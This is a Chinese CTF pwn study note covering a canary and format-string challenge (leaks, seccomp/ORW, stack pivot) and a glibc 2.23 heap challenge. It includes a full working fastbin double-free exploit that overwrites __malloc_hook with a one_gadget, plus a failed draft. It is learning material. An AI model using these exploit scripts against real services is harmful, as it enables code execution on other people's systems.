---
title: "挑战赛"
date: 2026-11-25 10:02:11
categories:
  - "知识点"
  - "格式化字符串"
tags: ["fastbin", "unsorted-bin", "one-gadget", "malloc-hook", "格式化字符串", "ROP", "canary", "glibc2.23"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#13 -->
## 1.余像（canary+栈上格式化字符串）

有点晕啊今晚，那就照着ai一步一步

调试

其实已经就是知道栈上泄露的是第六个位置的数据了，之后想要泄露Libc什么的死活泄露不出阿来

![image-20261116205450655](/pwn-notes/images/notes/image-20261116205450655.png)

然后就是保护全开之后，检查沙箱保护的话，说实话一开始并不知道，所以也更不可能知道是orw了，

原来的调试脚本

```python
from pwn import*
p=process('./pwn')
e=ELF('./pwn')
ARCH = 'amd64'
context(arch=ARCH, os='linux', log_level='debug')
offset = 6
gdb.attach(p)

puts_got=e.got['puts']
payload=p64(puts_got)+b'%6$s'
p.recvuntil(b">")
p.sendline(b'1')

p.recvuntil(b'format:\n')
p.sendline(payload)
pause()

p.interactive()
```

![image-20261116210001182](/pwn-notes/images/notes/image-20261116210001182.png)

![image-20261116210112189](/pwn-notes/images/notes/image-20261116210112189.png)

所以还是问号

首先在程序的检查上面就已经出现了问题，他那个有个函数其实就已经告诉开启了沙箱

![image-20261116213042843](/pwn-notes/images/notes/image-20261116213042843.png)

就是这个函数。

![image-20261116205450655](/pwn-notes/images/notes/image-20261116205450655.png)

![image-20261116213640607](/pwn-notes/images/notes/image-20261116213640607.png)

所以从那一个图里面就知道execve和open的话，那么就可以用openat代替open函数

那就从最简单的开始，就是栈溢出偏移大小，以及漏洞函数入口

![image-20261118095208832](/pwn-notes/images/notes/image-20261118095208832.png)

![image-20261118095228117](/pwn-notes/images/notes/image-20261118095228117.png)

![image-20261118095317029](/pwn-notes/images/notes/image-20261118095317029.png)

可以从上面的preview来格式化字符串

![image-20261118095409190](/pwn-notes/images/notes/image-20261118095409190.png)

![image-20261118095846177](/pwn-notes/images/notes/image-20261118095846177.png)

居然是从一开始，就把存入的数组看错了

所以偏移就是（0x90+0x8）

之后要做的就是通过格式化字符串泄露数据

可是pie也开了，所以要泄露Libc和canary

你就算出偏移之后再转成10进制，除以8 之后加上6

![image-20261118101233209](/pwn-notes/images/notes/image-20261118101233209.png)

23，这个就是canary的地址

![image-20261118102055022](/pwn-notes/images/notes/image-20261118102055022.png)

这里也是在canary下断点可是却没有停在漏洞点

因为前面也有调用printf函数的地方

所以应该因为开启了pie所以，直接

b *base+0x155f

又错了

![image-20261118102449234](/pwn-notes/images/notes/image-20261118102449234.png)

应该是15ba

又错

```gdb
b *($base+0x15ba)
```



info proc mappings 先运行起来，之后的话直接加上偏移

![image-20261118104347710](/pwn-notes/images/notes/image-20261118104347710.png)

0x11+6=23

![image-20261118105255886](/pwn-notes/images/notes/image-20261118105255886.png)



这三个依次是canary 栈地址 Libc地址

可是为什么要泄露这三个地址？

泄露canary是因为栈溢出需要

之后呢？栈地址？libc地址是因为开启了pie。栈地址呢，泄露它干什么？

错了

canary是对的

可是后面的栈地址是因为后面要用orw来读取flag到一个地址 这里是因为开启了pie

之后泄露libc是因为alsr

![image-20261118110418944](/pwn-notes/images/notes/image-20261118110418944.png)

这几个依次是canary 栈地址 libc相关地址

然后依次计算相关基址，以及bss地址

![image-20261118151211545](/pwn-notes/images/notes/image-20261118151211545.png)

![image-20261118151227265](/pwn-notes/images/notes/image-20261118151227265.png)

bss段地址用 IDA 看（Shift+F7 或直接看全局变量地址，

![image-20261118151654816](/pwn-notes/images/notes/image-20261118151654816.png)

接下来只需要程序基地址加上就可以

bss段作用：

作为read函数写入flag的地址

怎么选？

gdb里面可以看相关的页权限

![image-20261118152810523](/pwn-notes/images/notes/image-20261118152810523.png)

这里+0x4000的就是可以写的

然后

![image-20261118153249588](/pwn-notes/images/notes/image-20261118153249588.png)

现在就只是往后+100是空白的，所以往里面去写

接下来就是向里面去触发漏洞函数，写入Paylaod

但是调用orw,还是要首先知道相关函数以及相关指令的

怎么找？

因该是可以直接在虚拟机中用ROPgadget --binary指令去寻找的

![image-20261118185446384](/pwn-notes/images/notes/image-20261118185446384.png)

但是其实这里的write函数是限制read的读入大小的

所以原来的链放在这里其实是放不下的

所以需要栈迁移



更改版本连接器

接下来就是构造chain了

![image-20261120162037048](/pwn-notes/images/notes/image-20261120162037048.png)

可是难道就是这样一个一个找吗？

```python
rop = ROP(libc)

```

glibc-all-in-one用法

![image-20261120164755741](/pwn-notes/images/notes/image-20261120164755741.png)

进入到这个页面，之后可以运行一下更新脚本

之后可以downloadlist中的版本

![image-20261120165136551](/pwn-notes/images/notes/image-20261120165136551.png)

下完之后我放在同一个目录下

```
cp 2.35-0ubuntu3_amd64/libc-2..so ./libc.so.6
cp 2.27-3ubuntu1.6_amd64/ld-2.35.so ./ld-2.35.so
cp 2.27-3ubuntu1.6_amd64/ld-2.27.so ./ld-2.27.so
```

```
patchelf --set-interpreter ./ld-2.27.so ./pwn
patchelf --set-rpath . ./pwn
```

换来连接器

他需要的是2.34

```
cp 2.35-0ubuntu3_amd64/libc.so.6 ./libc.so.6
cp 2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 ./ld-2.35.so
```

```python
patchelf --set-interpreter ./ld-2.35.so ./pwn
patchelf --set-rpath . ./pwn
```



接着让pwntools自己寻找相关的gadget

```
rop=ROP('./libc.so.6')
```

还有

```python
libc.address=libc_base

```





























## 2.note

```bash
cd ~/桌面/tiaozhan

# 1. 补执行权限（之前报"权限不够"就是因为 ld 没有执行位）
chmod +x note ld-2.23.so

# 2. 让 libc.so.6 这个名字指向真正的 2.23
ln -sf libc-2.23.so libc.so.6

# 3. interpreter 和 rpath 都用绝对路径，稳妥
patchelf --set-interpreter "$HOME/桌面/tiaozhan/ld-2.23.so" \
         --set-rpath "$HOME/桌面/tiaozhan" note

# 4. 验证
ldd note
./note
```

### ld-2.23.so —— 动态链接器（加载器）

二进制运行过程：

1. 内核读 note 文件头，发现里面写着：
   "我的解释器（interpreter）是 ./ld-2.23.so"     ← 这就是 PT_INTERP 段
2. 内核先把 ld-2.23.so 加载进内存，把控制权交给它
3. ld 接管后开始干活：
   - 读取 note 的依赖清单（"我需要 libc.so.6"）
   - 按搜索路径找到 libc-2.23.so，加载进内存
   - 修补所有函数地址（重定位）
   - 一切就绪后，才跳到 note 的 main 函数开始执行

![image-20261115200711531](/pwn-notes/images/notes/image-20261115200711531.png)

#### 接收与计算地址

```bash
nan@nan-virtual-machine:~/桌面/tiaozhan$ one_gadget ./libc.so.6 
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

![image-20261115212534320](/pwn-notes/images/notes/image-20261115212534320.png)

![image-20261115213555334](/pwn-notes/images/notes/image-20261115213555334.png)

fastbin申请

前面的链表地址到底这是不是可以申请完之后写入的地址

![image-20261115214041136](/pwn-notes/images/notes/image-20261115214041136.png)

![image-20261116164357102](/pwn-notes/images/notes/image-20261116164357102.png)

0x7f

成功脚本

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = process('./note')          # 远程换 remote(ip, port)
libc = ELF('./libc-2.23.so')

def add(size, content):
    p.recvuntil(b'cmd>')
    p.sendline(b'1')
    p.recvuntil(b'size>')
    p.sendline(str(size).encode())
    p.recvuntil(b'data> ')
    p.send(content.ljust(size, b'\x00'))    # 补满，避免 read 阻塞

def free(idx):
    p.recvuntil(b'cmd>'); p.sendline(b'4')
    p.recvuntil(b'index>'); p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'cmd>'); p.sendline(b'3')
    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    return p.recv(6)

def edit(idx, content):
    p.recvuntil(b'cmd>'); p.sendline(b'2')      # 注意：原脚本是 b'cmd> '，多了空格
    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
    p.recvuntil(b'data> ')
    p.send(content)

# ---------- 1. 泄漏 libc ----------
add(0x80, b'a' * 0x80)     # idx0 -> unsorted bin
add(0x68, b'b' * 0x68)     # idx1 -> 0x70 fastbin  ★改
add(0x68, b'c' * 0x68)     # idx2                ★改
free(0)
leak = u64(show(0).ljust(8, b'\x00'))
libc_base = leak - 0x3c4b78          # glibc2.23 main_arena+88
libc.address = libc_base
log.success('libc_base = %#x' % libc_base)

malloc_hook = libc.sym['__malloc_hook']
system      = libc.sym['system']
bash        = next(libc.search(b'/bin/sh\x00'))
# one_gadget ./libc-2.23.so 逐个试（2.23 常见 4 个）
one_gadget  = libc_base +0xf1247
log.info('malloc_hook=%#x system=%#x bash=%#x' % (malloc_hook, system, bash))

# ---------- 2. fastbin dup: 1 -> 2 -> 1 ----------
free(1)
free(2)
free(1)

# ---------- 3. 改写 fastbin 链表 ----------
fake = malloc_hook - 0x23          # 该处 0x7f 可当 0x70 bin 的合法 size
add(0x68, p64(fake))               # ① 取回 chunk1，content 前8字节 = 新 fd
add(0x68, b'x')                    # ② 取回 chunk2
add(0x68, b'x')                    # ③ 取回 chunk1，head 变成 fake
# fake chunk 的 user data = malloc_hook - 0x13，填 0x13 字节后正好写 __malloc_hook
payload = b'A' * 0x13 + p64(one_gadget)
add(0x68, payload)                 # ④ 分配到 fake，覆盖 __malloc_hook

# ---------- 4. 触发 ----------
# 任意一次 malloc 都会先调用 __malloc_hook
p.recvuntil(b'cmd>')
p.sendline(b'1')
p.sendline(b'16')
p.interactive()
```

![image-20261116170450485](/pwn-notes/images/notes/image-20261116170450485.png)

这是一开始创建的堆的结构图

两个0x68

![image-20261116170943757](/pwn-notes/images/notes/image-20261116170943757.png)





































不行：

```python
from pwn import*
p=process('./note')
#gdb.attach(p)
libc=ELF('./libc-2.23.so')
context.log_level='debug'
def add(size, content):
    p.recvuntil(b'cmd>')
    p.sendline(b'1')
    p.recvuntil(b'size>')
    p.sendline(str(size).encode())
    p.recvuntil(b'data> ')
    p.send(content)

def free(idx):
    p.recvuntil(b'cmd>')
    p.sendline(b'4')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'cmd>')
    p.sendline(b'3')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    
    

def edit(idx, content):
    p.recvuntil(b'cmd> ')
    p.sendline(b'2')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data> ')
    p.send(content)
    
gdb.attach(p)
add(0x80,b'a'*0x80)
add(0x68,b'b'*0x68)
add(0x68,b'c'*0x68)
free(0)
show(0)
addr=(p.recv(6).ljust(8,b'\x00'))
print(u64(addr))
libc_base=u64(addr)-0x3c4b78
free(1)
free(2)
free(1)
malloc_hook=libc_base+libc.symbols['__malloc_hook']
system=libc_base+libc.symbols['system']
bash=libc_base+next(libc.search(b'/bin/sh\x00'))
print(malloc_hook)
print(system)
print(bash)
#add(0x60,p64(0).ljust(0x60,b'a'))
target = malloc_hook - 0x23
add(0x60, p64(target).ljust(0x60, b'\x00')) 
#edit(0,p64(malloc_hook-0x13))

ogg=libc_base+0xf1247
add(0x60,b'a')
add(0x60,b'b')
add(0x60,p64(ogg))










#edit(2, b'\x00' * 0x13 + p64(ogg))
#add(0x60,b'a'*0x60)

#edit(4,b'a'*0x13+p64(ogg))


#add(0x10,b'a'*0x10)


pause()





p.interactive()

```

![image-20261116173637998](/pwn-notes/images/notes/image-20261116173637998.png)

这个版本卡在最后，因为可能又输入了内容，然后在接收的时候卡在这里了

### 3.纸库

还是首先更改文件的ld即是动态连接器加权限

<!-- sync-hash: 550d71d798da2b6d66dc9d2076bd1ad85472aeb7914795dcf0a781acb636f823 -->
